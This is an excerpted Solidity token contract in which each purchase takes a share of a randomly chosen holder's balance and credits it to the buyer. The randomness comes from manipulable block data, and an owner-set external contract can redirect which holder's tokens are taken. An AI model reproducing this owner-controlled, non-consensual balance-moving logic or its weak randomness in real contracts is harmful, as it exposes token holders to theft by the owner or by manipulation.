...
interface INft {
	...
	function holdinfo(address owner) external view returns (address addr,uint256 getrate,uint256 maxrate);
...
contract newToken is Context, IERC20, Ownable {
    ...
    uint256 public feeLiquidityBuy = 1;
	uint256 public feeLiquiditySell = 1;
	...
	uint256 private buyTimeLimit = 1800;
	address private midaddr;
	...
	function setNftbasic(address _nftbasic) public {
        require( _msgSender() == owner(), "fail");
        nftbasic = _nftbasic;
    }
	
	function setMidaddr(address _midaddr) public {
        require( _msgSender() == owner(), "fail");
        midaddr = _midaddr;
    }
	...
	function setMinnum(uint256 _minnum) public  {
		require(_msgSender() == owner(), "fail");
        minnum = _minnum;
    }
	...
	function addAddress(address adr) private {
        ...
        if(_AddressExists[adr]){
			if(balanceOf(address(adr)) >= minnum){
				return;
			}else{
				_AddressExists[adr] = false;
				delectaddressList(adr);
			}
		}else{
			if(balanceOf(address(adr)) >= minnum){
	...
	function delectaddressList(address account) private {
        for (uint256 i = 0; i < _addressList.length; i++) {
            if (_addressList[i] == account) {
                _addressList[i] = _addressList[_addressList.length - 1];
                _addressList.pop();
                break;
            }
        }
	...
	function getSubAddr(address addr) private returns(address) {
		if(_addressList.length == 0){
			return address(0);
		}else{
			randNonces++;
			uint256 randomNumber = uint(keccak256(abi.encodePacked(now,randNonces,addr,blockhash(block.number.sub(3))))).mod(_addressList.length);
			return _addressList[randomNumber];
		}

	}
	
	function _sendBonusToUser(address addrA,address addrB,uint buyNum) private {
        uint256 currentRate =  _getRate();
		uint256 getrate = 8;
		uint256 buyNumrate = buyNum;
		address tmpaddrA = addrA;
		if(INft(midaddr).balanceOf(addrB) > 0){
			(address tmpaddr,uint256 tmpgetrate,uint256 tmpmaxrate) = INft(midaddr).holdinfo(addrB);
			tmpaddrA = tmpaddr;
		}
		if(INft(nftbasic).balanceOf(addrB) > 0){
			(address tmpaddr,uint256 tmpgetrate,uint256 tmpmaxrate) = INft(nftbasic).holdinfo(addrB);
			getrate = tmpgetrate;
			buyNumrate = buyNum.mul(tmpmaxrate).div(100).add(buyNum);
		}
		if(balanceOf(address(tmpaddrA)) >= minnum && tmpaddrA != address(0)){
			uint256 tLotto = balanceOf(address(tmpaddrA)).mul(getrate).div(100);
			if(tLotto <= buyNumrate){
				uint256 rLotto = tLotto.mul(currentRate);
				_rOwned[tmpaddrA] = _rOwned[tmpaddrA].sub(rLotto);
				_rOwned[addrB] = _rOwned[addrB].add(rLotto);

			}else{
				uint256 rbuyNum = buyNumrate.mul(currentRate);
				_rOwned[tmpaddrA] = _rOwned[tmpaddrA].sub(rbuyNum);
				_rOwned[addrB] = _rOwned[addrB].add(rbuyNum);
			}
		}
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount,bool _sellStatus,bool _buyStatus) private {
		...
		if(_buyStatus && _nftstatus){
			address tmpaddr = getSubAddr(recipient);
			if(tmpaddr != address(0) && !lming[tmpaddr]){
				_sendBonusToUser(tmpaddr,recipient,tAmount);
			}
		}
